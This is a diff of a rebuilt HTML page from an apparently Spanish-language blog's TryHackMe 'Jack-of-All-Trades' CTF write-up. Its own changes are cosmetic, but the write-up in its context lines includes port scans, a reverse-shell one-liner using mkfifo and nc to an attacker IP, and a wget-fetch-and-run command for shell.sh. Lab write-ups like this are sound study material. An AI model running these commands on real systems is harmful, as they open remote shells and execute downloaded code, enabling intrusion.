@@ -18,9 +18,9 @@
 
 <script defer src="/js/lazysizes.min.31dd6a2d3a1ec0f78a8df007535cf23f03aeb5c70f026e6d6a19dac3b3acc340.js"></script>
 
-<script defer src="/js/helper/getParents.min.ccd45f158c1b17849307ba913a72beac239c410f2b6e648496a79842da84e55b.js"></script>
+<script defer src="/js/helper/getParents.min.1618c696be7c98933f9a92677f518b512a74e55bdbb976b09936b4182e93181b.js"></script>
 
-<script defer src="/js/helper/fadeinout.min.9fb19682560d5fa5596fffec85da605067c4acc86aad05add4d8fff9d362a446.js"></script>
+<script defer src="/js/helper/fadeinout.min.93a331f96194789a542f33690bbe4f0c102c7e78ffc018217f5a1c33010bad91.js"></script>
 
 <script defer src="/js/helper/closest.min.js"></script>
   
@@ -1257,7 +1257,7 @@
     <meta property="twitter:description" content="Jack-of-All-Trades es una maquina de TryHackMe, SSH está presente en un puerto diferente y en el puerto 22 vemos una pagina web con algunos retos CTF Like que nos dieron acceso al usuario Jack y, con la ejecucion de un binario con permisos SUID obtuvimos la flag root.">
   
 
-<meta name="generator" content="Hugo 0.92.0" />
+<meta name="generator" content="Hugo 0.68.3" />
 <meta name="msapplication-TileColor" content="#1d1d1d">
 
 <meta name="theme-color" content="#1d1d1d">
@@ -1602,7 +1602,7 @@
   🏷️
   
 
-  <li><a href="https://sckull.github.io/tags/caesar/" class="single__tag" title="caesar">caesar</a></li>
+  <li><a href="https://sckull.github.io/tags/suid/" class="single__tag" title="suid">suid</a></li>
   
 
   <li><a href="https://sckull.github.io/tags/steganography/" class="single__tag" title="steganography">steganography</a></li>
@@ -1611,10 +1611,10 @@
   <li><a href="https://sckull.github.io/tags/steghide/" class="single__tag" title="steghide">steghide</a></li>
   
 
-  <li><a href="https://sckull.github.io/tags/suid/" class="single__tag" title="suid">suid</a></li>
+  <li><a href="https://sckull.github.io/tags/hydra/" class="single__tag" title="hydra">hydra</a></li>
   
 
-  <li><a href="https://sckull.github.io/tags/hydra/" class="single__tag" title="hydra">hydra</a></li>
+  <li><a href="https://sckull.github.io/tags/caesar/" class="single__tag" title="caesar">caesar</a></li>
   
 
 </ul>
@@ -1665,7 +1665,7 @@
 <p>Escaneo de puertos tcp, nmap nos muestra el puerto ssh (80) y el puerto http (22) abiertos.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1686,7 +1686,7 @@
 </span><span class="lnt">19
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># Nmap 7.80 scan initiated Wed Apr  8 17:56:03 2020 as: nmap -sV -sC -o nmap_scan 10.10.111.123</span>
+<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># Nmap 7.80 scan initiated Wed Apr  8 17:56:03 2020 as: nmap -sV -sC -o nmap_scan 10.10.111.123</span>
 Nmap scan report <span class="k">for</span> 10.10.111.123
 Host is up <span class="o">(</span>0.20s latency<span class="o">)</span>.
 Not shown: <span class="m">998</span> closed ports
@@ -1721,7 +1721,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 <p>Utilizamos gobuster para busqueda de directorios y archivos.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1738,7 +1738,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 </span><span class="lnt">15
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">root@upset:~/thm/jack-of-All-Trades# gobuster dir -u http://10.10.111.123:22/ -w /usr/share/wordlists/dirb/common.txt -t <span class="m">25</span> -x php,html,txt -q
+<pre class="chroma"><code class="language-bash" data-lang="bash">root@upset:~/thm/jack-of-All-Trades# gobuster dir -u http://10.10.111.123:22/ -w /usr/share/wordlists/dirb/common.txt -t <span class="m">25</span> -x php,html,txt -q
 /.htpasswd <span class="o">(</span>Status: 403<span class="o">)</span>
 /.htpasswd.html <span class="o">(</span>Status: 403<span class="o">)</span>
 /.htpasswd.txt <span class="o">(</span>Status: 403<span class="o">)</span>
@@ -1762,7 +1762,7 @@ root@upset:~/thm/jack-of-All-Trades#
 <p>Nos dirigimos a <strong>/recovery.php</strong> e intentamos utilizar la contraseña con <code>Johny Grave</code> y combinacion del nombre pero no nos deja ingresar.<br />
 <img src="/images/posts/thm/jackofalltrades/Screenshot%20from%202020-04-08%2017.10.49.webp" alt="image" /></p>
 <p>Vemos en el codigo fuente una string codificada.</p>
-<pre tabindex="0"><code>GQ2TOMRXME3TEN3BGZTDOMRWGUZDANRXG42TMZJWG4ZDANRXG42TOMRSGA3TANRVG4ZDOMJXGI3DCNRXG43DMZJXHE3DMMRQGY3TMMRSGA3DONZVG4ZDEMBWGU3TENZQGYZDMOJXGI3DKNTDGIYDOOJWGI3TINZWGYYTEMBWMU3DKNZSGIYDONJXGY3TCNZRG4ZDMMJSGA3DENRRGIYDMNZXGU3TEMRQG42TMMRXME3TENRTGZSTONBXGIZDCMRQGU3DEMBXHA3DCNRSGZQTEMBXGU3DENTBGIYDOMZWGI3DKNZUG4ZDMNZXGM3DQNZZGIYDMYZWGI3DQMRQGZSTMNJXGIZGGMRQGY3DMMRSGA3TKNZSGY2TOMRSG43DMMRQGZSTEMBXGU3TMNRRGY3TGYJSGA3GMNZWGY3TEZJXHE3GGMTGGMZDINZWHE2GGNBUGMZDINQ=
+<pre><code>GQ2TOMRXME3TEN3BGZTDOMRWGUZDANRXG42TMZJWG4ZDANRXG42TOMRSGA3TANRVG4ZDOMJXGI3DCNRXG43DMZJXHE3DMMRQGY3TMMRSGA3DONZVG4ZDEMBWGU3TENZQGYZDMOJXGI3DKNTDGIYDOOJWGI3TINZWGYYTEMBWMU3DKNZSGIYDONJXGY3TCNZRG4ZDMMJSGA3DENRRGIYDMNZXGU3TEMRQG42TMMRXME3TENRTGZSTONBXGIZDCMRQGU3DEMBXHA3DCNRSGZQTEMBXGU3DENTBGIYDOMZWGI3DKNZUG4ZDMNZXGM3DQNZZGIYDMYZWGI3DQMRQGZSTMNJXGIZGGMRQGY3DMMRSGA3TKNZSGY2TOMRSG43DMMRQGZSTEMBXGU3TMNRRGY3TGYJSGA3GMNZWGY3TEZJXHE3GGMTGGMZDINZWHE2GGNBUGMZDINQ=
 </code></pre><p>Utilizamos base32 y hex para decodificar la cadena, lo cual nos devuelve una nueva cadena cifrada, esta vez al parecer es Caesar Cipher.<br />
 <img src="/images/posts/thm/jackofalltrades/Screenshot%20from%202020-04-08%2017.15.28.webp" alt="image" /></p>
 <p><a href="https://www.dcode.fr/caesar-cipher"><strong>dcode.fr tiene una herramienta</strong></a> muy util que nos ayudó a decifrar el mensaje, CAesar Cipher.<br />
@@ -1776,9 +1776,9 @@ root@upset:~/thm/jack-of-All-Trades#
 <p>Le pasamos un comando al parametro <code>cmd</code> y logramos ejecutar el comando.<br />
 <img src="/images/posts/thm/jackofalltrades/Screenshot%20from%202020-04-08%2017.25.21.webp" alt="image" /></p>
 <p>Ahora que podemos ejecutar comandos, utilizamos esta ventaja para obtener una shell inversa, primero creamos un archivo el que contenga nuestro comando para nuestra shell.</p>
-<pre tabindex="0"><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.8.1.72 1338 &gt;/tmp/f
+<pre><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.8.1.72 1338 &gt;/tmp/f
 </code></pre><p>Creamos un pequeño servidor http con python3 <code>python3 -m http.server 80</code>. Ejecutamos el siguiente comando para obtener nuestra shell.</p>
-<pre tabindex="0"><code>bash -c  &quot;$(wget -qO- 10.8.1.72/shell.sh)&quot; 
+<pre><code>bash -c  &quot;$(wget -qO- 10.8.1.72/shell.sh)&quot; 
 </code></pre><p>Y ponemos a la escucha netcat en nuestra maquina <code>rlwrap nc -lvp 1338</code> y obtenemos nuestra shell.<br />
 <img src="/images/posts/thm/jackofalltrades/Screenshot%20from%202020-04-08%2018.05.44.webp" alt="image" /></p>
 <h1 id="user---jack">USER - JACK</h1>
@@ -1900,7 +1900,7 @@ root@upset:~/thm/jack-of-All-Trades#
     </div>
     <div class="whoami__desc">
       
-        Pentester wannabe
+        CTF Player | RedTeamer &amp; Pentester wannabe
       
     </div>
     <div class="whoami__social">
@@ -2086,7 +2086,7 @@ root@upset:~/thm/jack-of-All-Trades#
 </div>
 
 
-<script defer src="/js/swipe.min.d70095d96ef6a016133ea2c732c5d4713539d335b739178e356af46f54cf0a16.js"></script>
+<script defer src="/js/swipe.min.08ff2be1b74347bad9e267f732f1388d271b2f9d97b6a8a87bd6a510f17c5ad2.js"></script>
 
 <script defer src="/js/micromodal.min.de01b44b2f383056bbcaf6ee921fd385d79108ec1129afd0eb2f3f5a07e11f45.js"></script>
 
